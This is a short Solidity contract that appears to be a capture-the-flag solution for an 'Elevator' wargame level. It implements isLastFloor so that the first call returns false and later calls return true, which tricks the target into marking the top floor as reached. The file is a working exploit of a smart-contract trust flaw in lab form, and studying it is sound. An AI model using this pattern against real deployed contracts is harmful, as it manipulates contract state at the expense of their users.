// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.0;

interface IBuilding {
  function isLastFloor(uint) external returns (bool);
}


interface Elevator {
  function goTo(uint _floor) external;
}

contract Level11 is IBuilding {

    bool private hasRun  = false;
    
    Elevator private  elevator; 

    constructor (Elevator _elevator){
        elevator = _elevator;
    }

    function goToTop() external{
        elevator.goTo(10);
    }

    function isLastFloor(uint) external override returns (bool){
        if (!hasRun){
            hasRun = true; 
            return false;
        }
        else{
            return true;
        }
    }
}